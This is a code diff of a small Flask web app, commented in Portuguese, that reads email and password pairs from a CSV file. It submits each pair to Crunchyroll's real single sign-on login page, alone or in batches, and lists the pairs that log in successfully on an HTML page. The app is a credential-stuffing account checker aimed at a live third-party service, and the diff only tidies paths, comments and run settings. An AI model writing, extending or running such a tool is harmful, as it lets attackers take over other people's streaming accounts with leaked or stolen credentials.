@@ -1,17 +1,16 @@
 from flask import Flask, request, jsonify, render_template_string
 import pandas as pd
 import requests
+import os
 
 app = Flask(__name__)
 
-# Dados CSV simulados (para o exemplo). No Replit, use um CSV real.
-csv_file = 'dados2.csv'
+# Carregar dados do CSV (ajuste o caminho se necessário)
+csv_file = os.path.join(os.path.dirname(__file__), '..', 'dados2.csv')
 tabela = pd.read_csv(csv_file)
 
-# URL do site para login
 login_url = 'https://sso.crunchyroll.com/pt-br/login?return_url=%2Fauthorize%3Fclient_id%3Dnoaihdevm_6iyg0a8l0q%26redirect_uri%3Dhttps%3A%2F%2Fwww.crunchyroll.com%2Fcallback%26response_type%3Dcookie%26state%3D%252F'
 
-# Lista para armazenar as contas com login bem-sucedido
 contas_validas = []
 
 @app.route('/login', methods=['POST'])
@@ -20,7 +19,6 @@ def login():
     email = data.get('email')
     senha = data.get('senha')
     
-    # Simulação de requisição de login (substitua pelos parâmetros reais)
     response = requests.post(login_url, data={'email': email, 'password': senha})
     
     if response.ok and response.url != login_url:
@@ -47,10 +45,8 @@ def batch_login():
     
     return jsonify({"resultados": resultados})
 
-# Rota para exibir contas válidas
 @app.route('/contas_validas', methods=['GET'])
 def exibir_contas_validas():
-    # Template HTML simples para exibir as contas válidas
     html_template = """
     <!DOCTYPE html>
     <html lang="pt-br">
@@ -81,6 +77,7 @@ def exibir_contas_validas():
     """
     return render_template_string(html_template, contas=contas_validas)
 
+# Para uso em plataformas que exigem main
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=8080, debug=True)
+    app.run()
 
